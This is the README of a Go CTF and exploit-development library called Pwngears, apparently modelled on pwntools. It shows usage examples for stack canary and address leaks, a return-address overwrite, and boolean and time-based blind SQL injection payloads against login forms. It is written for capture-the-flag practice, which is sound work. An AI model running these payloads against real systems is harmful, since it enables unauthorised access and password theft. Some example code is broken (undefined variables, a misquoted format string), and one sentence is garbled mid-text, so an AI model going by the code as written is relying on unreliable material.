Pwngears is a CTF framework and exploit development library based on pwntools. It aims to provide an improved API and better error handling while adding more functionnalities regarding challenges other than binary exploitation. It also aims to provide its core package without any external dependencies, leveraging the Go standard library. 

## Why Go?
- Compiles into a static binary, eliminating risk of an exploit not working on somebody else version of the python interpreter. Also has easy cross compilation.
- Good performance and cheap goroutines allows for easy and quick byte-by-bytes leaks, length leaks and blind SQLI.
- The Go standard library provides all the tooling to make this library possible. This eliminates the dependency on other libraries the same way pwntools requires.
- Strong static typing helps prevents inattention errors during the writing of your exploit.
- Compare to other great compiled language, Go also provide good developer velocity with a clear and concise syntax.
- No indentation based blocks, enough said

## Quick Showcase
```go
// Binary Exploitation
p := Process("./supersecure")
defer p.Close()

p.SendLineAfter("Name: ", "Arthur")
response := p.RecvLineString()

exploit := NewExploit(r)
exploit.SetConnectFunc(func() pwn.Tube {
	conn := Connect("127.0.0.1", 12069)
	p.SendLine("Arthur")
	return conn
})

canary := exploit.LeakCanary(40, func(tube pwn.Tube) bool {
	resp := tube.RecvLine()
	return Contains(resp, "Saved")
})

retAddr := exploit.LeakAddress(40, canary, 8, func(tube pwn.Tube) bool {
	resp := tube.RecvLine()
	return Contains(resp, "Saved")
})

pieBase := retAddr - 0x1811
winAddr := pieBase + 0x12e9

payload := Pay().
	PadTo(40).
	Canary(canary).
	Repeat("B", 8).
	P64(winAddr).
	SendWithSize(r).
	Send(response)

r.SendPayload(payload)

key := r.RecvAllString(3 * time.Second)

// Web
conn := Conn("http://some-ctf-website.com")

resp := conn.Get("/search",
	WithParam("query", "admin"),
	WithHeader("Content-Type", "application/json"),
	WithCookie("admin-key", key))

var pass string
passPattern := regexp.MustCompile(`pass: (.*)`)
for _, line := range resp.Lines() {
	pass = pattern.FindStringSubmatch(line)[1]
}

form := NewForm()
form.Set("username", "admin")
form.Set("pass", pass)
loginResp := conn.Post("/login", form)

var flag string
flagPattern := regexp.MustCompile(`FLAG:{(.*)}`)
if flagPattern.MatchString() {
	flag = flagPattern.FindStringSubmatch(line)[1]
}
fmt.Printf("FLAG: %v, flag")

```

## Installation
```sh
go get github.com/tonythetender/pwngears
```
Pwngears uses a hierarchy of different packages detached from the core package which allows you to only import what you need for the current exploit. For example, if you're doing a web challenge you wont need functions relating to binary exploitation. As such you can decide only import whats needed for web challenges. 

```go
import "github.com/tonythetender/pwngears/web"
```
If you need to do bruteforcing, you can decide to also import the core bruteforcing package and its web components. 
```go
import (
	"github.com/tonythetender/pwngears/web"
	"github.com/tonythetender/pwngears/bruteforce"
	"github.com/tonythetender/pwngears/bruteforce/bfweb"
)

```
This allows for a more focused API for the user needs. This also means that if some external dependencies are added in the future, those can be plugins that the user won't need to include in their binaries if they're not being used.
## Basic Syntax

> [!NOTE]
> For the purpose of writing more compact code and because exploit dont normally involve a ton of other imports, we'll be using the `.` notation on imports. If you want to import other libraries or write your own functions that conflict with pwngears exported function, feel free to use more explicit import. 

### Errors returns or logging
This framework provides 2 different ways to open a connection. The methods attached to the connection will act the same but their return values will vary depending on the connection chosen. Because exploits shouldn't be more verbose than they need to be, the user can opt to not have errors returned from any methods. Instead a logger is used. This is the default connection.

```go
conn := Conn("http://some-ctf-website.com")
resp := conn.Get("/")
```

While the default log level is `INFO`, the user can also set a custom logger by passing a logger to the connection constructor. The user can customized their own slog logger or use the default logger constructor with the chosen log level.
```go
logger, _ := NewDefaultLogger("DEBUG")
conn := ConnWithLogger("http://some-ctf-website.com", logger)
resp := conn.Get("/")
```

or
```go
conn := Conn("http://some-ctf-website.com")
conn.SetLogLevel("ERROR")
resp := conn.Get("/")
```
By default, the program will stop when an error is encountered. You can modify this behavior with the following function.
```go
conn.SetFailOnError(false)
```

The second way is with the more idiomatic, but verbose Go errors return. When opening the connection with the following function, all the methods will return an error value, except when it doesnt apply. You can then decide how to handle the error.
```go
conn, err := ConnWithErrors("http://some-ctf-website.com")
if err != nil {
	log.Fatalf("Connection couldn't be established: %v", err)
}
resp, err := conn.Get("/")
if err != nil {
	log.Fatalf("Error during GET request: %v", err)
}
```
> [!NOTE]
> The example given above are with the web connection, but they all work the same way with process and remote connections, as well as other constructors like the bruteforcer. Just replace `Conn` with `Process` or `Remote`. From here on out, to keep the documentation concise, the connection with the logger will be used.
        
### Web
You'll first need to import the web package.
```go
import (
	. "github.com/tonythetender/pwngears"
	. "github.com/tonythetender/pwngears/web"
)
```

This connection will hold at users should know, even when skimming content.track of things like cookies and headers while also making sure the connection doesn't timeout or redirect indefinitely.

From there you can make GET request simply like this :
```go
resp := conn.Get("/")

fmt.Println(resp.Text())
```

You can also add query directly in the string or by adding parameters
```go
resp := conn.Get("/search",
	WithParam("category", "shoes"),
	WithParam("color", "blue"),
	WithParam("size", "9"))

```
You can add header the same way or cookies the same way
```go
resp, err := conn.Get("/search",
	WithHeader("Content-Type", "application/json"))
```


### Binary exploitation
You'll first need to import the process package.
```go
import . "github.com/tonythetender/pwngears/process"
```
To do binary exploitation (ie pwning and reverse) you can connect to a process either localy through an executable
```go
conn := Process("./command")
defer conn.Close()
```
Or through a tcp connection
```go
conn := Remote("127.0.0.1", 12069)
```
With the possibility of SSL over TCP
```go
conn := RemoteSSL("127.0.0.1", 12069)
```
You can then send inputs directly to the process. The library takes care of converting the string to bytes, but you can also explicitly send bytes to it. Those wont be converted again.
```go
r.SendLine("shellcode")
r.SendLine([]byte("shellcode"))
```
You can also send an input after the process as output a certain line
```go
r.SendLineAfter("Name: ", "John")
```

## Advanced Syntax

### Web
A lot of challenge will require you to iterate over alphanumeric character in order to find the next missing character. For example, when doing SQL injection, you might get a feedback if the start of your input is correct so you need to iterate over every character until you find the whole input. Using the integrated BruteForcer makes this simple.
```go
import (
	. "github.com/tonythetender/pwngears/bruteforce"
	. "github.com/tonythetender/pwngears/web"
)

func BruteForceFormExample(ctf *web.WebConn) string {
	conn := Conn("http://some-ctf-website.com")

	exploit := NewBruteforcer()
	// Multiple charset options are available but you can also pass a custom
	// string that will be used as the charset
	exploit.Charset = GenerateCharset("alphanumeric", "special")
	exploit.MaxLength = 24
	exploit.Delay = 50 * time.Millisecond

	// Different bruteforcer are available, here we use PostRequestBf
	// for bruteforcing a form sent through a POST request
	password := exploit.CharByChar(`admin' AND password like '`, `%' --`, PostRequestBf(
		conn.Client,
		"/login",
		"username",
		// For every attempt, the bruteforcer will make sure this field is filled
		AlsoFillFormField("password", "Joe"),
		// The input will be consider valid if the following two conditions are true
		WithoutBodyContains("invalid"),
		WithResponseCode(200),
	))
	return password
}
```
### Time-based SQLI
Lets say your SQLI doesn't provide you with proper response telling you if your query is correct. Different database provide way to make the query take longer in the event that the query is true. Lets say youre trying to find the password of the user id 1 by sleeping when the character is correct. You can make it so that if the response takes above 3 seconds, it counts as valid.
```go
func BruteForceFormExample(conn *web.WebConn) string {
	exploit := NewBruteforcer()
	exploit.Charset = GenerateCharset("digits")
	exploit.MaxLength = 10

	prefix := `1 UNION SELECT IF(SUBSTRING(user_password,1,1) = CHAR(`
	suffix := `),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM users WHERE user_id = 1;`

	password, _ := exploit.CharByChar(prefix, suffix, PostRequestBf(
		conn.Client,
		"/login",
		"username",
		web.WithResponseTimeAbove(3 * time.Second),
	))
	return password
}

```

### Binary Exploitation
Some function were added to facilitate the process of leaking a canary or and address. You can set up your exploit like this
```go
exploit := NewExploit(r)
exploit.SetConnectFunc(func() pwn.Tube {
	conn := Remote("127.0.0.1", 12069)
	r.SendLine("Arthur")
	return conn
})

canary := exploit.LeakCanary(40, func(tube pwn.Tube) bool {
	resp := tube.RecvLine()
	// The character is correct when the "Saved" line is displayed
	return Contains(resp, "Saved")
})

retAddr := exploit.LeakAddress(40, canary, 8, func(tube pwn.Tube) bool {
	resp := tube.RecvLine()
	return Contains(resp, "Saved")
})

pieBase := retAddr - 0x1811
winAddr := pieBase + 0x12e9

Pay().
	PadTo(40).
	Canary(canary).
	Repeat("B", 8).
	P64(winAddr).
	SendWithSize(r)
```
